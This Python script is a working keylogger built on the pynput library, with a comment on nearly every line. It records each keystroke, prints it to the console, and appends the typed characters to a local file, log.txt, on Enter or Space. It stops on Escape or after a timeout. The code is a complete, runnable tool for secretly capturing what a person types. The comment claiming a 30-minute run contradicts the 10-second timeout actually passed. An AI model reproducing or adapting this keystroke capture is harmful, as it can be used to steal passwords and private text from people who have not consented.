from typing import List  # Import List for type hinting


# Import Key and Listener to monitor keyboard events
from pynput.keyboard import Key, Listener 


# Global variables to store key logs
char_count = 0  # Keeps track of the number of characters logged in a session
saved_keys = []  # Stores the sequence of pressed keys before writing to a file




def on_key_press(key: str):
   """
   Callback function that gets executed when a key is pressed.
   Prints the pressed key to the console.
   """
   try:
       print("Key Pressed: ", key)  # Display the key in the terminal
   except Exception as ex:
       print("There was an error: ", ex)  # Handle and print any errors




def on_key_release(key):
   """
   Callback function that gets executed when a key is released.
   Handles writing to a file when Enter or Space is pressed.
   Stops logging when the Escape key is pressed.
   """
   global saved_keys, char_count  # Access global variables


   if key == Key.esc:  # Stop key logging if Escape key is pressed
       return False
   else:
       if key == Key.enter:  # If Enter key is pressed, write keys to file
           write_to_file(saved_keys)  # Save recorded keys
           char_count = 0  # Reset character count
           saved_keys = []  # Clear stored keys


       elif key == Key.space: 
           # If Space key is pressed, treat it as a separator
           key = " "  # Replace with actual space character


           write_to_file(saved_keys)  # Save recorded keys
           saved_keys = []  # Reset saved keys
           char_count = 0  # Reset character count


       saved_keys.append(key)  # Add the pressed key to the list
       char_count += 1  # Increment character count




def write_to_file(keys: List[str]):
   """
   Writes recorded keystrokes to a log file ('log.txt').
   Filters out keys that contain the word 'key' (e.g., Key.shift).
   """
   with open("log.txt", "a") as file:  # Open the log file in append mode
       for key in keys:
           key = str(key).replace("'", "")  # Remove single quotes


           if "key".upper() not in key.upper():
               # Ignore special keys like 'Key.shift'
               file.write(key)  # Write the key to the log file


       file.write("\n")  # Add a newline after each set of recorded keys




# Start the keylogger using the Listener
with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
   print("Start key logging...")  # Notify that logging has started
   listener.join(10)  # Run for 30 minutes (60 sec * 30 min)
   print("End key logging...")  # Notify that logging has ended
